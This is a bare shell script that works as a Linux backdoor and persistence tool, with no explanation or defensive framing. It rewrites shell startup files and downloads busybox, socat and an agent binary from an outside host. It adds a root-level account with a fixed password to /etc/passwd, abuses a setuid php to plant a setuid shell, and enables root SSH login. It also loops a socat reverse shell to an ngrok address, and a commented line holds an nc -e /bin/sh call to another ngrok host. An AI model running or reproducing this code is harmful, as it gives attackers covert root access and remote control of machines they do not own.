cd /tmp
exec 1>./x1
exec 2>./x2
set -x
TZ=UTC-8
s1="export PATH=\$PATH:/tmp;TZ=UTC-8;
uptime;grep NA /etc/os-release 2>&1;
alias ll='ls -al';
which busybox&&(busybox netstat --help 2>&1 |grep programs);
alias nn='busybox netstat -anlp';alias pp='ps aux';alias p='busybox pstree -p';
stty rows 60 columns 400 2>&1 ;
#ll /tmp;which bash;
#which nc&&(nc --help;nc -e /bin/sh ngrok2.xiaomiqiu.cn 34302);
sp=\$PS1;PS1=\${sp//\\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\\\u\}}
PS6=\${sp//\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\u\}}
PS7=\${sp//\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\u\}}
PS8=\${sp//\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\u\}}
PS9=\${sp//\\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\u\}}
PS10=\${sp//\\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\\u\}}
PS11=\${sp//\\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\\\u\}}
"
s2="grep -q sftp-server /proc/\$\$/cmdline&&(
    echo \"[ \$@ ]\$\$ \$PPID\">>non_pil.lrc;ps -ef 2>&1 >>non_pil.lrc;date +%F%T  2>&1 >>non_pil.lrc;cat /proc/\$\$/cmdline>>non_pil.lrc;   
)||( echo non_pil;$s1)"

sum2() {
    [ -f ./agent.linux ] && (
        chmod 0777 ./agent.linux
        ./agent.linux -l 61080 &
    ) || return 1
    echo "bash -c '{sleep,699}&'"
    return 0
}
ln2() {
    ln -s $1 ps && ln -s $1 ash && ln -s $1 netstat && ($1 uptime >>tm) && ln -s $1 wget
    return 0
}
alias ll="ls -al"
export PATH=$PATH:/tmp
export HOME=/tmp
echo "echo  pil;$s1" >~/.bash_profile
ll
cp ~/.bash_profile ~/.ash_profile
echo "$s2" >~/.bashrc
cp ~/.bashrc ~/.ashrc
touch 0a9.txt
if which sudo && (sudo -v &>/dev/null); then echo $(whoami) is sudo_user; else echo $(whoami) is not sudo_user or hasn_t sudo; fi
#if [ 1=1 ]; then echo 123; else echo 45; fi
b="busybox"
b2="/tmp/${b}"
soc="./socat"
soc2="/tmp/${soc}"
rr1="http://www.localhost.serfend.top/"
rr2="${rr1}${b}.bin"
rr3="${rr1}socat.bin"
rr4="file_put_contents('${b}',file_get_contents('${rr2}'));chmod('${b}',0777);"

which busybox && b2=$(which busybox)

which busybox && ln2 ${b2} || (
    if [ ! -f ./busybox ]; then
        if [ ! -f /busybox ]; then
            (which curl && curl -v -o ${b} ${rr2}) || (which wget && wget -O ${b} ${rr2}) || (which php && php -n -r $rr4)
        else
            cp /busybox ./
        fi
        ([ -f ${b} ]) && chmod 0777 busybox && ln2 ${b2}
    fi
)
d0="/bin/sh"
(which ash) && d0=$(which ash)
(which bash) && d0=$(which bash)

(which php) &&
    {
        [ -u $(which php) ] &&
            {
                grep "tee" /etc/passwd || (
                    php -n -r "copy('/etc/passwd','/etc/passwd.bak');file_put_contents('/etc/passwd','tee:\$1\$123456\$wOSEtcyiP2N/IfIl15W6Z0:0:0:toor:/tmp/:${d0}'.PHP_EOL,FILE_APPEND);"
                    {
                        sleep 0.2
                        echo 'su - tee'
                        sleep 0.5
                        echo 123456
                        sleep 0.6
                        echo 123456
                        echo id
                        sleep 0.2
                        cp ${d0} /bin/xxsh
                        echo chmod u+s /bin/xxsh
                        echo ls -al /bin/xxsh
                        echo exit
                    } | script /dev/null
                )
            }
    }

which socat && soc2="socat" || (
    if [ ! -f ${soc2} ]; then
        [ -x ./wget ] && ./wget -O socat ${rr3} && chmod 0777 socat
    fi
)
#echo "${soc2}  yyy $HOSTNAME "

s3="(${b2} netstat -an | grep \":1001\") && echo 1001_nice ||
            ( 
                (${b2} netstat -an | grep \":22\") && echo || sleep 5
                (
                    echo \"ssh -f -o StrictHostKeyChecking=no -N -D 0.0.0.0:1001 tee@127.0.0.1\"
                    sleep 0.6
                    echo 123456
                    sleep 0.6
                    echo 123456
                    echo exit
                    echo exit
                ) | script /tmp/null
            )"

shsC='(${b2} ps aux|grep -E "[s][s][h][d]")&&(grep "^PermitRootLogin yes" /etc/ssh/sshd_config&&echo sshd_yes_nice||sed -i "s/^#\?\(PermitRootLogin\)/\1 yes#/g" /etc/ssh/sshd_config)||echo ssh_cfg_fail'

(id | grep "^uid=0(root)") && (#echo ${b2}
    hostN2=$(cat /etc/hostname)
    [ "$HOSTNAME" = "goorm" -o "$hostN2" = "goorm" ] && (
        grep "tee" /etc/passwd ||
            (
                cp /etc/passwd /etc/passwd.bak
                #echo "tee:\$1\$123456\$wOSEtcyiP2N/IfIl15W6Z0:0:0:toor:/tmp:/bin/bash" >>/etc/passwd
            )
        echo "${s3}" >>/tmp/deal
    )

    [ "$HOSTNAME" = "out" ] && sh -c "${shsC}" && /etc/init.d/ssh restart && (
        grep "tee" /etc/passwd ||
            (
                cp /etc/passwd /etc/passwd.bak
                echo "tee:\$1\$123456\$wOSEtcyiP2N/IfIl15W6Z0:0:0:toor:/tmp:/bin/bash" >>/etc/passwd
            )
        sh -c "${s3}"
    )
)

(id | grep "^uid=[0-9]\{1,9\}(runner)") && (
    touch /tmp/keepalive
    sudo bash -c "id;/tmp/ps -ef >/dev/null;
    $shsC
    /etc/init.d/ssh restart"

    grep "tee" /etc/passwd || (
        sudo bash -c 'id;cp /etc/passwd /etc/passwd.bak;echo "tee:\$1\$123456\$wOSEtcyiP2N/IfIl15W6Z0:0:0:toor:/tmp:/bin/bash" >>/etc/passwd;
        $s3 '
    )
)

d1="sh -il"
[ -x ./ash ] && d1="/tmp/ash -il"
(which bash) && d1="bash -pil"

(${soc2} -v tcp-l:9494,bind=127.8.8.8,fork,reuseaddr exec:"$d1",pty,stderr,setsid,sigint,sane &)
( 
    (while true; do
        [ ! -f 0a9.txt ] && break
        ${soc2} -t5 exec:"$d1",pty,stderr,setsid,sigint,sane tcp:'ngrok.xiaomiqiu123.top':34292 
        sleep 10
    done) &
) &

#ngrok.xiaomiqiu123.top:34292 
#

(${b2} ps aux | grep -E "[6][1][0][8][0]") && echo 61080_ok || (
    sum2 || ([ -x ./wget ] && ./wget "${rr1}agent.linux" && sum2)
)

if [ ! -z ${sp9} ]; then sleep $sp9; fi
#[ -z ${sp5} ] && sleep $sp5